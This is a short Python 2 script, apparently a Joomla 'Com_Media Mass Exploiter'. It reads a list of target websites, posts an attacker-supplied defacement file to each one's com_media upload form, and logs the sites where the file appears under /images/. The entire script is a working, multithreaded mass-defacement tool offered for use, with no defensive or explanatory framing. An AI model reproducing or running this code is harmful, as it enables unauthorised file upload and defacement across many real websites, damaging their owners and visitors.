# Coded by elv1n4  - 29/10/2010
import requests, re
import concurrent.futures
Exp = '/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder='
ses = requests.session()
headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0' }
def Exploit(url):
	try:
		if url:
			global filename
			files = {'Filedata[]': open(filename, 'rb')}
			if not re.search('http(s)?://', url):
				url = 'http://'+url
			req = ses.get(url+Exp, headers=headers)
			act = re.findall('<form action="(.*)" id="uploadForm" class="form-horizontal" name="uploadForm" method="post" enctype="multipart/form-data">', req.text)
			ses.post(act[0], files=files, headers=headers)
			cek = ses.get(url+'/images/'+filename, headers=headers)
			if 'by' in cek.text or 'By' in cek.text or 'BY' in cek.text or 'bY' in cek.text:
				print 'Vuln! '+url+'/images/'+filename
				open('result.txt', 'a').write(url+'/images/'+filename+'\n')
			else:
				print "Gak Vuln Kak Hihi! " + url
	except:
		pass
print '''
~ - Com_Media Mass Exploiter
~ - Powered By ./W4D3R 1337 JawaTengahXploit
'''
list = open(raw_input('Web List:: '), 'r').read().split('\n')
Thread = input('Thread:: ')
filename = raw_input("your script deface:: ")
if list:
	try:
		with concurrent.futures.ThreadPoolExecutor(int(Thread)) as executor:
			executor.map(Exploit,list)
	except:
		print('Error!!')
